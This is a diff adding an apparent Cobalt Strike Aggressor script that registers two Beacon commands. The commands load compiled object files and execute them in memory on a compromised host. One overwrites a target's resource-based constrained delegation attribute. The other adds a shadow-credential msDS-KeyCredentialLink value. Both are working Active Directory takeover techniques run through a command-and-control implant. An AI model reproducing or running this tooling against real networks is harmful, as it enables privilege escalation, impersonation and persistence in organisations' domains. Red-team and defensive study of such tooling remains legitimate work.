@@ -1,0 +1,73 @@
+sub ldap_bofs_read_object {
+    local('$path $handle $data');
+    $path = script_resource($1);
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+sub ldap_bofs_validate {
+    local('$bid $usage');
+    $bid = $1;
+    $usage = $2;
+    if (size(@_) != 5) {
+        berror($bid, $usage);
+        return 0;
+    }
+    if (barch($bid) ne "x64") {
+        berror($bid, "ldap_bofs requires an x64 Beacon");
+        return 0;
+    }
+    if (strlen($3) == 0 || strlen($4) == 0 || strlen($5) == 0) {
+        berror($bid, $usage);
+        return 0;
+    }
+    return 1;
+}
+
+alias ldap_bofthedog {
+    local('$bid $usage $data $packed');
+    $bid = $1;
+    $usage = "Usage: ldap_bofthedog <domain-or-dc> <target-dn> <security-descriptor-hex>";
+    if (size(@_) != 4) { berror($bid, $usage); return; }
+    if (!ldap_bofs_validate($bid, $usage, $2, $3, $4)) { return; }
+
+    $data = ldap_bofs_read_object("bofthedog/rbcd.x64.o");
+    if (strlen($data) == 0) {
+        berror($bid, "could not read bofthedog/rbcd.x64.o");
+        return;
+    }
+    $packed = bof_pack($bid, "zzz", $2, $3, $4);
+    btask($bid, "Tasked Beacon to replace RBCD on $3");
+    beacon_inline_execute($bid, $data, "go", $packed);
+}
+
+alias ldap_bofwhisker {
+    local('$bid $usage $data $packed');
+    $bid = $1;
+    $usage = "Usage: ldap_bofwhisker <domain-or-dc> <target-dn> <key-credential>";
+    if (size(@_) != 4) { berror($bid, $usage); return; }
+    if (!ldap_bofs_validate($bid, $usage, $2, $3, $4)) { return; }
+
+    $data = ldap_bofs_read_object("bofwhisker/keycred.x64.o");
+    if (strlen($data) == 0) {
+        berror($bid, "could not read bofwhisker/keycred.x64.o");
+        return;
+    }
+    $packed = bof_pack($bid, "zzz", $2, $3, $4);
+    btask($bid, "Tasked Beacon to add an msDS-KeyCredentialLink value on $3");
+    beacon_inline_execute($bid, $data, "go", $packed);
+}
+
+beacon_command_register(
+    "ldap_bofthedog",
+    "Replace msDS-AllowedToActOnBehalfOfOtherIdentity using the current Beacon identity.",
+    "Usage: ldap_bofthedog <domain-or-dc> <target-dn> <security-descriptor-hex>"
+);
+
+beacon_command_register(
+    "ldap_bofwhisker",
+    "Add an msDS-KeyCredentialLink value using the current Beacon identity.",
+    "Usage: ldap_bofwhisker <domain-or-dc> <target-dn> <key-credential>"
+);
